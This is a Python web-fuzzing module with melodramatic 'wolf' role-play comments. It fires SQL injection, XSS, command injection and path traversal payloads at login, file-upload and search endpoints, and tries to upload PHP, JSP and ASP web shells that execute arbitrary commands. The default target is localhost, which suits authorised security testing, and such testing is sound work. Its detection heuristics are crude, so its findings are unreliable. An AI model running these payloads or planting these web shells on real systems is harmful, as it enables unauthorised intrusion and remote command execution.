"""
🐺 ENDPOINT-SPECIFIC FUZZING

*snarls with predatory glee* Targeted fuzzing for specific endpoint types
with specialized attack vectors!
"""

import asyncio
import httpx
import random
import time
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from rich.console import Console
from rich.panel import Panel

from .payload_generator import PayloadGenerator
from .comprehensive_fuzzer import FuzzResult, ComprehensiveFuzzer

console = Console()

class EndpointFuzzer:
    """
    *circles with menacing intent* Specialized fuzzing for specific endpoint types
    
    *bares fangs with savage satisfaction* Each endpoint type gets its own
    customized attack vectors!
    """
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.payload_generator = PayloadGenerator()
        self.session = httpx.AsyncClient(timeout=30.0)
        
    async def __aenter__(self):
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.aclose()
    
    async def fuzz_login_endpoint(self, endpoint: str = "/api/auth/login") -> List[FuzzResult]:
        """Fuzz login endpoint with authentication bypass attempts"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING LOGIN ENDPOINT: {endpoint}[/bold red]\n"
            "*snarls with predatory glee* Time to break your authentication!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # SQL injection attempts
        sql_payloads = [
            {"username": "' OR 1=1 --", "password": ""},
            {"username": "admin'--", "password": ""},
            {"username": "admin' #", "password": ""},
            {"username": "' or '1'='1", "password": "' or '1'='1"},
            {"username": "admin", "password": "' OR 1=1 --"},
            {"username": "admin", "password": "admin'--"},
        ]
        
        # XSS attempts
        xss_payloads = [
            {"username": "<script>alert('XSS')</script>", "password": "test"},
            {"username": "admin", "password": "<img src=x onerror=alert('XSS')>"},
        ]
        
        # Special character attempts
        special_payloads = [
            {"username": "", "password": ""},
            {"username": " ", "password": " "},
            {"username": "null", "password": "null"},
            {"username": "undefined", "password": "undefined"},
            {"username": "\x00", "password": "\x00"},
            {"username": "a" * 1000, "password": "a" * 1000},
        ]
        
        all_payloads = sql_payloads + xss_payloads + special_payloads
        
        for payload in all_payloads:
            result = await self._send_login_request(url, payload)
            results.append(result)
        
        return results
    
    async def _send_login_request(self, url: str, payload: Dict[str, str]) -> FuzzResult:
        """Send a login request with fuzzed payload"""
        start_time = time.time()
        
        try:
            response = await self.session.post(url, json=payload)
            end_time = time.time()
            
            # Analyze response for authentication bypass
            vulnerability_detected = False
            vulnerability_type = None
            
            if response.status_code == 200:
                response_data = response.json()
                if "access_token" in response_data or "token" in response_data:
                    vulnerability_detected = True
                    vulnerability_type = "Authentication Bypass"
            
            return FuzzResult(
                url=url,
                method="POST",
                payload=str(payload),
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method="POST",
                payload=str(payload),
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e)
            )
    
    async def fuzz_file_upload_endpoint(self, endpoint: str = "/api/files/upload") -> List[FuzzResult]:
        """Fuzz file upload endpoint with malicious files"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING FILE UPLOAD ENDPOINT: {endpoint}[/bold red]\n"
            "*bares fangs with savage satisfaction* Let's break your file security!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Malicious file types
        malicious_files = [
            ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
            ("shell.asp", b"<% eval request(\"cmd\") %>", "application/x-asp"),
            ("shell.py", b"import os; os.system(input())", "application/x-python"),
            ("shell.sh", b"#!/bin/bash\n/bin/bash", "application/x-sh"),
            ("shell.bat", b"@echo off\ncmd.exe", "application/x-bat"),
            ("shell.exe", b"MZ\x90\x00", "application/x-executable"),
            ("shell.jpg", b"\xFF\xD8\xFF\xE0\x00\x10JFIF", "image/jpeg"),  # Fake JPEG
            ("shell.png", b"\x89PNG\r\n\x1a\n", "image/png"),  # Fake PNG
        ]
        
        # Path traversal filenames
        path_traversal_files = [
            ("../../../etc/passwd", b"test content", "text/plain"),
            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", b"test content", "text/plain"),
            ("/proc/self/cmdline", b"test content", "text/plain"),
        ]
        
        all_files = malicious_files + path_traversal_files
        
        for filename, content, content_type in all_files:
            result = await self._send_file_upload_request(url, filename, content, content_type)
            results.append(result)
        
        return results
    
    async def _send_file_upload_request(self, url: str, filename: str, content: bytes, content_type: str) -> FuzzResult:
        """Send a file upload request with malicious file"""
        start_time = time.time()
        
        try:
            files = {"file": (filename, content, content_type)}
            response = await self.session.post(url, files=files)
            end_time = time.time()
            
            # Analyze response for file upload vulnerability
            vulnerability_detected = False
            vulnerability_type = None
            
            if response.status_code == 200:
                response_text = response.text.lower()
                if "uploaded" in response_text or "success" in response_text:
                    vulnerability_detected = True
                    vulnerability_type = "File Upload Vulnerability"
            
            return FuzzResult(
                url=url,
                method="POST",
                payload=f"filename={filename}, content_type={content_type}",
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method="POST",
                payload=f"filename={filename}, content_type={content_type}",
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e)
            )
    
    async def fuzz_search_endpoint(self, endpoint: str = "/api/search") -> List[FuzzResult]:
        """Fuzz search endpoint with injection attempts"""
        console.print(Panel.fit(
            f"[bold red]🐺 FUZZING SEARCH ENDPOINT: {endpoint}[/bold red]\n"
            "*snarls with predatory glee* Time to break your search security!",
            border_style="red"
        ))
        
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Search payloads
        search_payloads = [
            # SQL injection
            "' OR 1=1 --",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "' or '1'='1",
            
            # XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            
            # Command injection
            "; ls -la",
            "| whoami",
            "` id `",
            "$(whoami)",
            
            # Special characters
            "\x00",
            "\n",
            "\r\n",
            "\\",
            "\"",
            "'",
            "`",
            "|",
            "&",
            ";",
            "<",
            ">",
            
            # Long strings
            "a" * 1000,
            "a" * 10000,
        ]
        
        for payload in search_payloads:
            result = await self._send_search_request(url, payload)
            results.append(result)
        
        return results
    
    async def _send_search_request(self, url: str, payload: str) -> FuzzResult:
        """Send a search request with fuzzed payload"""
        start_time = time.time()
        
        try:
            # Try as query parameter
            params = {"q": payload, "search": payload, "query": payload}
            response = await self.session.get(url, params=params)
            end_time = time.time()
            
            # Analyze response for injection vulnerability
            vulnerability_detected, vulnerability_type = self._analyze_search_response(response, payload)
            
            return FuzzResult(
                url=url,
                method="GET",
                payload=payload,
                status_code=response.status_code,
                response_time=end_time - start_time,
                response_size=len(response.content),
                vulnerability_detected=vulnerability_detected,
                vulnerability_type=vulnerability_type
            )
            
        except Exception as e:
            end_time = time.time()
            return FuzzResult(
                url=url,
                method="GET",
                payload=payload,
                status_code=0,
                response_time=end_time - start_time,
                response_size=0,
                error=str(e)
            )
    
    def _analyze_search_response(self, response: httpx.Response, payload: str) -> tuple[bool, Optional[str]]:
        """Analyze search response for injection vulnerabilities"""
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Check for SQL injection
        if any(indicator in response_text for indicator in ["sql syntax", "mysql", "database error"]):
            return True, "SQL Injection"
        
        # Check for XSS
        if payload_lower in response_text and any(tag in payload_lower for tag in ["<script>", "<img", "<svg"]):
            return True, "XSS"
        
        # Check for path traversal
        if any(indicator in response_text for indicator in ["root:", "etc:", "windows", "system32"]):
            return True, "Path Traversal"
        
        # Check for command injection
        if any(indicator in response_text for indicator in ["command not found", "permission denied", "whoami:"]):
            return True, "Command Injection"
        
        return False, None
    
    async def fuzz_api_endpoint_comprehensive(self, endpoint: str, method: str = "GET") -> List[FuzzResult]:
        """Comprehensive fuzzing of a specific API endpoint"""
        console.print(Panel.fit(
            f"[bold red]🐺 COMPREHENSIVE FUZZING: {method} {endpoint}[/bold red]\n"
            "*packs hunting formation* Coordinating multiple attack vectors!",
            border_style="red"
        ))
        
        # Use the comprehensive fuzzer for this endpoint
        async with ComprehensiveFuzzer(self.base_url) as fuzzer:
            return await fuzzer.fuzz_endpoint(endpoint, method, payload_count=100)

async def main():
    """Main execution function for testing"""
    async with EndpointFuzzer() as fuzzer:
        # Test different endpoint types
        await fuzzer.fuzz_login_endpoint()
        await fuzzer.fuzz_file_upload_endpoint()
        await fuzzer.fuzz_search_endpoint()

if __name__ == "__main__":
    asyncio.run(main())
